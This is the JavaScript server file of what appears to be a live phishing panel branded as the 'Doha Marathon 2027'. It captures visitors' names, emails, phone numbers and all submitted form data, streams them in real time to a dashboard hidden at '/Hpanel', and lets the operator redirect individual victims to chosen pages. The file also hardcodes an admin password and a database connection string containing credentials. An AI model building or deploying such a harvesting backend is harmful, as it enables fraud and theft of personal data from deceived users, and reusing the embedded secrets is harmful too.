const express = require("express");
const http = require("http");
const path = require("path");
const crypto = require("crypto");
const { Server } = require("socket.io");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

const ADMIN_USER = process.env.ADMIN_USER || "Hadmin";
const ADMIN_PASS = process.env.ADMIN_PASS || "Hadmin12345@@";
const PROJECT_NAME = process.env.PROJECT_NAME || "ماراثون الدوحة 2027";

const DATABASE_URL = process.env.DATABASE_URL || "postgresql://postgres.eufqevqctgerwqqcssar:nN%2FG.BC%2574R7NfH@aws-0-eu-central-1.pooler.supabase.com:6543/postgres";

let dbReady = false;
const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  connectionTimeoutMillis: 10000,
  idleTimeoutMillis: 30000,
  max: 5
});

const io = new Server(server, {
  cors: { origin: true, methods: ["GET", "POST"], credentials: true }
});

app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: "10mb" }));

// --- In-memory session store (PRIMARY source for real-time data) ---
const sessions = new Map();
const liveSockets = new Map();
const authTokens = new Set();

function generateToken() {
  return crypto.randomBytes(48).toString("hex");
}

function authMiddleware(req, res, next) {
  const token = req.headers["authorization"]?.replace("Bearer ", "") || req.headers["x-auth-token"] || "";
  if (!token || !authTokens.has(token)) {
    return res.status(401).json({ error: "غير مصرح" });
  }
  next();
}

// --- In-memory session helpers ---
function getSessionMem(sessionId) {
  return sessions.get(sessionId) || null;
}

function upsertSessionMem(sessionId, data) {
  const existing = sessions.get(sessionId) || {
    sessionId,
    name: "",
    email: "",
    phone: "",
    currentPage: "index",
    isConnected: false,
    formData: {},
    lastSeen: Date.now()
  };

  if (data.name) existing.name = data.name;
  if (data.email) existing.email = data.email;
  if (data.phone) existing.phone = data.phone;
  if (data.currentPage) existing.currentPage = data.currentPage;
  if (data.isConnected !== undefined) existing.isConnected = data.isConnected;
  if (data.formData) {
    if (!existing.formData) existing.formData = {};
    Object.assign(existing.formData, data.formData);
  }
  existing.lastSeen = Date.now();

  sessions.set(sessionId, existing);
  return existing;
}

function getStatsMem() {
  let connected = 0;
  let total = sessions.size;
  for (const s of sessions.values()) {
    if (s.isConnected) connected++;
  }
  return { connectedUsers: connected, totalRegistrations: total };
}

function getAllSessionsMem() {
  return Array.from(sessions.values()).sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
}

// --- DB helpers (background sync, never blocks real-time) ---
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        name TEXT,
        email TEXT,
        phone TEXT,
        current_page TEXT DEFAULT 'index',
        is_connected BOOLEAN DEFAULT false,
        form_data JSONB DEFAULT '{}',
        last_seen BIGINT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);
    dbReady = true;
    console.log("[DB] Tables ready, database connected");

    const res = await pool.query("SELECT * FROM sessions ORDER BY last_seen DESC");
    let loaded = 0;
    for (const r of res.rows) {
      if (!sessions.has(r.session_id)) {
        sessions.set(r.session_id, {
          sessionId: r.session_id,
          name: r.name || "",
          email: r.email || "",
          phone: r.phone || "",
          currentPage: r.current_page || "index",
          isConnected: false,
          formData: r.form_data || {},
          lastSeen: parseInt(r.last_seen) || Date.now()
        });
        loaded++;
      }
    }
    if (loaded > 0) console.log(`[DB] Loaded ${loaded} sessions from database`);
  } catch (err) {
    dbReady = false;
    console.error("[DB] Init error (will use in-memory only):", err.message);
  }
}

function dbSync(sessionId, data) {
  if (!dbReady) return;
  pool.query(`
    INSERT INTO sessions (session_id, name, email, phone, current_page, is_connected, form_data, last_seen)
    VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
    ON CONFLICT (session_id) DO UPDATE SET
      name = COALESCE(NULLIF($2, ''), sessions.name),
      email = COALESCE(NULLIF($3, ''), sessions.email),
      phone = COALESCE(NULLIF($4, ''), sessions.phone),
      current_page = COALESCE($5, sessions.current_page),
      is_connected = $6,
      form_data = sessions.form_data || $7,
      last_seen = $8
  `, [
    sessionId,
    data.name || "",
    data.email || "",
    data.phone || "",
    data.currentPage || "index",
    data.isConnected || false,
    JSON.stringify(data.formData || {}),
    Date.now()
  ]).catch(err => console.error("[DB] Sync error:", err.message));
}

function dbSetConnected(sessionId, connected) {
  if (!dbReady) return;
  pool.query("UPDATE sessions SET is_connected = $1, last_seen = $2 WHERE session_id = $3",
    [connected, Date.now(), sessionId]
  ).catch(err => console.error("[DB] SetConnected error:", err.message));
}

// --- Auth endpoints ---
app.post("/dashboard/login", (req, res) => {
  const { username, password } = req.body || {};
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = generateToken();
    authTokens.add(token);
    return res.json({ success: true, token });
  }
  res.status(401).json({ error: "اسم المستخدم أو كلمة المرور غير صحيحة" });
});

app.post("/dashboard/logout", (req, res) => {
  const token = req.headers["authorization"]?.replace("Bearer ", "") || req.headers["x-auth-token"] || "";
  authTokens.delete(token);
  res.json({ success: true });
});

// --- API endpoints ---
app.get("/api/config", (req, res) => {
  res.json({ projectName: PROJECT_NAME });
});

app.get("/api/stats", authMiddleware, (req, res) => {
  const stats = getStatsMem();
  res.json({ ...stats, activeUsers: stats.connectedUsers });
});

app.get("/api/users", authMiddleware, (req, res) => {
  res.json(getAllSessionsMem());
});

app.get("/api/user/:sessionId", authMiddleware, (req, res) => {
  const data = getSessionMem(req.params.sessionId);
  if (!data) return res.status(404).json({ error: "مستخدم غير موجود" });
  res.json(data);
});

app.post("/api/track", (req, res) => {
  const { sessionId, type, page, data } = req.body || {};
  if (!sessionId) return res.status(400).json({ error: "missing sessionId" });

  let session = getSessionMem(sessionId) || { currentPage: "index", formData: {} };

  if (type === "form-submit" && data) {
    const formUpdate = {};
    formUpdate[page || "unknown"] = data;
    session.formData = Object.assign(session.formData || {}, formUpdate);
    if (data.firstName) session.name = [data.firstName, data.lastName].filter(Boolean).join(" ");
    if (data.email) session.email = data.email;
    if (data.phone) session.phone = data.phone;
  }

  if (page) session.currentPage = page;

  const updated = upsertSessionMem(sessionId, session);
  dbSync(sessionId, updated);
  emitToDashboard(sessionId, updated, type === "form-submit" ? "form-submit" : "update", page, data);
  res.json({ ok: true });
});

// --- Navigate command store (HTTP fallback for socket navigate) ---
const pendingNavigate = new Map();

app.post("/api/navigate/:sessionId", authMiddleware, (req, res) => {
  const { page } = req.body || {};
  if (!page) return res.status(400).json({ error: "missing page" });
  pendingNavigate.set(req.params.sessionId, { page, ts: Date.now() });
  res.json({ ok: true });
});

app.get("/api/check-navigate/:sessionId", (req, res) => {
  const nav = pendingNavigate.get(req.params.sessionId);
  if (nav && (Date.now() - nav.ts) < 120000) {
    pendingNavigate.delete(req.params.sessionId);
    return res.json({ page: nav.page });
  }
  res.json({ page: null });
});

app.get("/api/health", (req, res) => {
  const stats = getStatsMem();
  res.json({
    status: "ok",
    dbReady,
    version: 2,
    sessionsInMemory: sessions.size,
    liveSocketsCount: liveSockets.size,
    connectedUsers: stats.connectedUsers,
    totalRegistrations: stats.totalRegistrations
  });
});

// --- Helper: emit events in dashboard-expected format ---
function emitToDashboard(sessionId, session, eventType, page, formData) {
  const payload = {
    sessionId,
    page: session.currentPage,
    name: session.name || "",
    email: session.email || "",
    phone: session.phone || "",
    isConnected: session.isConnected,
    formData: formData || (session.formData && session.formData[session.currentPage]) || {},
    allFormData: session.formData
  };

  if (eventType === "connected") {
    io.to("dashboard").emit("user:connected", payload);
  } else if (eventType === "disconnected") {
    io.to("dashboard").emit("user:disconnected", payload);
  } else if (eventType === "form-submit") {
    io.to("dashboard").emit("user:form-submit", { ...payload, page: page || session.currentPage });
  } else if (eventType === "page-change") {
    io.to("dashboard").emit("user:page-change", payload);
  }
  io.to("dashboard").emit("user:update", payload);
}

// --- Socket.io ---
io.on("connection", (socket) => {
  const { sessionId, instanceKey, token } = socket.handshake.query || {};

  if (token || instanceKey) {
    socket.join("dashboard");
    console.log("[WS] Dashboard socket joined:", socket.id);
  }

  if (sessionId) {
    liveSockets.set(sessionId, socket.id);
    console.log("[WS] Visitor connected:", sessionId);

    const session = upsertSessionMem(sessionId, { isConnected: true });
    dbSync(sessionId, session);
    emitToDashboard(sessionId, session, "connected");

    socket.on("user:join", ({ page }) => {
      const s = upsertSessionMem(sessionId, { currentPage: page || "index", isConnected: true });
      dbSync(sessionId, s);
      emitToDashboard(sessionId, s, "connected");
    });

    socket.on("user:form-submit", ({ page, formData }) => {
      const existing = getSessionMem(sessionId) || { formData: {} };
      const update = { isConnected: true, formData: existing.formData || {} };
      if (page && formData) {
        update.formData[page] = formData;
        if (formData.firstName) update.name = [formData.firstName, formData.lastName].filter(Boolean).join(" ");
        if (formData.email) update.email = formData.email;
        if (formData.phone) update.phone = formData.phone;
      }
      const s = upsertSessionMem(sessionId, update);
      dbSync(sessionId, s);
      emitToDashboard(sessionId, s, "form-submit", page, formData);
    });

    socket.on("user:page-change", ({ page }) => {
      const s = upsertSessionMem(sessionId, { currentPage: page, isConnected: true });
      dbSync(sessionId, s);
      emitToDashboard(sessionId, s, "page-change");
    });

    socket.on("disconnect", () => {
      liveSockets.delete(sessionId);
      console.log("[WS] Visitor disconnected:", sessionId);
      const s = upsertSessionMem(sessionId, { isConnected: false });
      dbSetConnected(sessionId, false);
      emitToDashboard(sessionId, s, "disconnected");
    });
  }

  socket.on("navigate", ({ sessionId: targetId, page }) => {
    pendingNavigate.set(targetId, { page, ts: Date.now() });
    const targetSocketId = liveSockets.get(targetId);
    if (targetSocketId) {
      io.to(targetSocketId).emit("navigate", { page });
    }
    const s = upsertSessionMem(targetId, { currentPage: page });
    dbSync(targetId, s);
    io.to("dashboard").emit("user:update", { sessionId: targetId, ...s });
  });
});

// --- Broadcast live stats every 3 seconds ---
setInterval(() => {
  const stats = getStatsMem();
  io.to("dashboard").emit("stats:live", {
    connectedUsers: stats.connectedUsers,
    totalRegistrations: stats.totalRegistrations,
    activeUsers: stats.connectedUsers
  });
}, 3000);

// --- Static files ---
// Hidden dashboard: serve at /Hpanel instead of /site
app.use("/Hpanel", express.static(path.join(__dirname, "site"), {
  extensions: ["html"],
  setHeaders: (res, filePath) => {
    if (filePath.endsWith(".html")) res.setHeader("Content-Type", "text/html; charset=utf-8");
  }
}));
// Block direct /site access
app.use("/site", (req, res) => { res.status(404).send("Not Found"); });
app.use(express.static(path.join(__dirname), {
  extensions: ["html"],
  setHeaders: (res, filePath) => {
    if (filePath.endsWith(".html")) {
      res.setHeader("Content-Type", "text/html; charset=utf-8");
    }
  }
}));

app.get("*", (req, res) => {
  res.status(404).send("Not Found");
});

// --- Start server ---
initDB().then(() => {
  server.listen(PORT, () => {
    console.log("[Server] Running on port " + PORT);
    console.log("[Server] DB status:", dbReady ? "connected" : "in-memory only");
  });
});
